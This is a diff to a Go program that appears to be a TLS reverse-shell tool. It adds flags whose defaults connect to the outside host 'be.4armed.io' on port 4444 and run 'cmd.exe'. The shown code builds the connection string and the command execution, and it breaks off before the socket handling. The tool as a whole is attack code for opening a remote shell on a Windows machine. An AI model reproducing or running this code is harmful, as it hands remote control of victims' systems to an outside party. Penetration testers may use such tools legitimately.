@@ -7,6 +7,8 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"crypto/x509/pkix"
+	"flag"
+	"fmt"
 	"log"
 	"math/big"
 	"os"
@@ -14,8 +16,11 @@ import (
 	"time"
 )
 
-var connectionString string
-var command string
+type Options struct {
+	Host    string
+	Port    string
+	Command string
+}
 
 func publicKey(priv interface{}) interface{} {
 	switch k := priv.(type) {
@@ -27,15 +32,16 @@ func publicKey(priv interface{}) interface{} {
 }
 
 func main() {
-	if len(connectionString) == 0 {
-		os.Exit(1)
-	}
+	options := &Options{}
 
-	if len(command) == 0 {
-		command = "cmd.exe"
-	}
+	flag.StringVar(&options.Host, "h", "be.4armed.io", "Host to connect to")
+	flag.StringVar(&options.Port, "p", "4444", "Port to connect to")
+	flag.StringVar(&options.Command, "c", "cmd.exe", "Command to run")
+	flag.Parse()
 
-	cmd := exec.Command(command)
+	connectionString := fmt.Sprintf("%s:%s", options.Host, options.Port)
+
+	cmd := exec.Command(options.Command)
 	priv, err := ecdsa.GenerateKey(elliptic.P521(), rand.Reader)
 	if err != nil {
 		log.Fatal(err)
